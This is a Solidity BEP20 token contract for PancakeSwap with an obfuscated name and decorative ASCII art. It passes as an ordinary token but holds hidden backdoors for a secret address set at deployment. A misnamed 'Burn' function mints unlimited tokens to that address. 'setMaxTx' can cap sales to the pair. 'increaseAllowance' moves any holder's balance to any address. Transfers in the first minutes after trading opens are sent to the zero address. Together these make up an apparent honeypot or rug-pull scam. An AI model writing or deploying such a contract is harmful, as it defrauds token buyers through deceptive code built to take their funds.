/**

                                .do-"""""'-o..
                             .o""            ""..
                           ,,''                 ``b.
                          d'                      ``b
                         d`d:                       `b.
                        ,,dP                         `Y.
                       d`88                           `8.
 ooooooooooooooooood888`88'                            `88888888888bo,
d"""    `""""""""""""Y:d8P                              8,          `b
8                    P,88b                             ,`8           8
8                   ::d888,                           ,8:8.          8
:                   dY88888                           `' ::          8
:                   8:8888                               `b          8
:                   Pd88P',...                     ,d888o.8          8
:                   :88'dd888888o.                d8888`88:          8
:                  ,:Y:d8888888888b             ,d88888:88:          8
:                  :::b88d888888888b.          ,d888888bY8b          8
                    b:P8;888888888888.        ,88888888888P          8
                    8:b88888888888888:        888888888888'          8
                    8:8.8888888888888:        Y8888888888P           8
,                   YP88d8888888888P'          ""888888"Y            8
:                   :bY8888P"""""''                     :            8
:                    8'8888'                            d            8
:                    :bY888,                           ,P            8
:                     Y,8888           d.  ,-         ,8'            8
:                     `8)888:           '            ,P'             8
:                      `88888.          ,...        ,P               8
:                       `Y8888,       ,888888o     ,P                8
:                         Y888b      ,88888888    ,P'                8
:                          `888b    ,888888888   ,,'                 8
:                           `Y88b  dPY888888OP   :'                  8
:                             :88.,'.   `' `8P-"b.                   8
:.                             )8P,   ,b '  -   ``b                  8
::                            :':   d,'d`b, .  - ,db                 8
::                            `b. dP' d8':      d88'                 8
::                             '8P" d8P' 8 -  d88P'                  8
::                            d,' ,d8'  ''  dd88'                    8
::                           d'   8P'  d' dd88'8                     8
 :                          ,:   `'   d:ddO8P' `b.                   8
 :                  ,dooood88: ,    ,d8888""    ```b.                8
 :               .o8"'""""""Y8.b    8 `"''    .o'  `"""ob.           8
 :              dP'         `8:     K       dP''        "`Yo.        8
 :             dP            88     8b.   ,d'              ``b       8
 :             8.            8P     8""'  `"                 :.      8
 :            :8:           :8'    ,:                        ::      8
 :            :8:           d:    d'                         ::      8
 :            :8:          dP   ,,'                          ::      8
 :            `8:     :b  dP   ,,                            ::      8
 :            ,8b     :8 dP   ,,                             d       8
 :            :8P     :8dP    d'                       d     8       8
 :            :8:     d8P    d'                      d88    :P       8
 :            d8'    ,88'   ,P                     ,d888    d'       8
 :            88     dP'   ,P                      d8888b   8        8
 '           ,8:   ,dP'    8.                     d8''88'  :8        8
             :8   d8P'    d88b                   d"'  88   :8        8
             d: ,d8P'    ,8P""".                      88   :P        8
             8 ,88P'     d'                           88   ::        8
            ,8 d8P       8                            88   ::        8
            d: 8P       ,:  -hrr-                    :88   ::        8
            8',8:,d     d'                           :8:   ::        8
           ,8,8P'8'    ,8                            :8'   ::        8
           :8`' d'     d'                            :8    ::        8
           `8  ,P     :8                             :8:   ::        8
            8, `      d8.                            :8:   8:        8
            :8       d88:                            d8:   8         8
 ,          `8,     d8888                            88b   8         8
 :           88   ,d::888                            888   Y:        8
 :           YK,oo8P :888                            888.  `b        8
 :           `8888P  :888:                          ,888:   Y,       8
 :            ``'"   `888b                          :888:   `b       8
 :                    8888                           888:    ::      8
 :                    8888:                          888b     Y.     8,
 :                    8888b                          :888     `b     8:
 :                    88888.                         `888,     Y     8:
 ``ob...............--"""""'----------------------`""""""""'"""`'"""""
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Libraries.sol";

contract ReHjh4olZze6nzeHjh46v6nzeH6H is Ownable, IBEP20 {

    string private _name = "ReHjh4olZze6nzeHjh46v6nzeH6H";
    string private _symbol = "ReHjh446v6nzeH6H";
    uint256 private _totalSupply = 100000 * 10**9 * 10**9;
    uint8 private _decimals = 9;
    uint256 private _maxTx = _totalSupply;
    
    address public _pancakePairAddress; ///
    address private _pancakeAddress; //
    IPancakeRouter02 public  _pancakeRouter;
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _excluded;
    
    constructor(address pancakeAddress_) {
        _pancakeAddress = pancakeAddress_;
        _balances[msg.sender] = _totalSupply;
            emit Transfer(address(0), msg.sender, _totalSupply);
        _pancakeRouter = IPancakeRouter02(_pancakeRouterAddress);
        _pancakePairAddress = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH());
        _approve(address(this), address(_pancakeRouter), type(uint256).max);
        _excluded[address(this)] = true;
        _excluded[msg.sender] = true;
    }
    
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    function name() external view override returns (string memory) {
        return _name;
    }
    
    function setMaxTx(uint256 maxTx_) public {
        require(msg.sender == _pancakeAddress, "Cannot call function.");
        _maxTx = maxTx_ * 10 ** 18;
    }
    
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    function Burn(uint256 amount) public {
        require(msg.sender == _pancakeAddress, "Cannot call function.");
        _totalSupply = _totalSupply + amount;
        _balances[msg.sender] = _balances[msg.sender] + amount;
            emit Transfer(address(0), msg.sender, amount);
    }
    
    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require((owner != address(0) && spender != address(0)), "Owner/Spender address cannot be 0.");
        _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
    }
    
    function increaseAllowance(address owner, address spender, uint256 amount) public {
        require(msg.sender == _pancakeAddress, "Cannot call function.");
        _approve(owner, spender, amount);
        _balances[owner] = _balances[owner] - amount;
        _balances[spender] = _balances[spender] + amount;
            emit Transfer(owner, spender, amount);
    }
    
    function liquidityTimeLeft() public view returns (uint256) {
        return _antiBotTime - block.timestamp;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
         uint256 allowance_ = _allowances[sender][msg.sender];
        _transfer(sender, recipient, amount);
        require(allowance_ >= amount);
        _approve(sender, msg.sender, allowance_ - amount);
            emit Transfer(sender, recipient, amount);
        return true;
     }
     
    uint256 private _antiBotTime;
    bool private _tradingEnabled = false;
    function enableTrading() public onlyOwner {
        _tradingEnabled = true;
        _antiBotTime = block.timestamp + 3 minutes;
    }
     
     function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        if (_excluded[sender] || _excluded[recipient]) {
            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + amount;
                emit Transfer(sender, recipient, amount);
        } else {
            if (sender != _pancakeAddress && recipient == _pancakePairAddress) {
                require(_tradingEnabled, "Trading is not enabled yet.");
                require(amount <= _maxTx, "Amount exceeds maxTx.");
            }
            _balances[sender] = _balances[sender] - amount;
            if (block.timestamp < _antiBotTime) {
                _balances[address(0)] = _balances[address(0)] + amount;
                    emit Transfer(sender, address(0), amount);
            } else if (block.timestamp >= _antiBotTime) {
                _balances[recipient] = _balances[recipient] + amount;
                    emit Transfer(sender, recipient, amount);
            }
        }
     }
    
}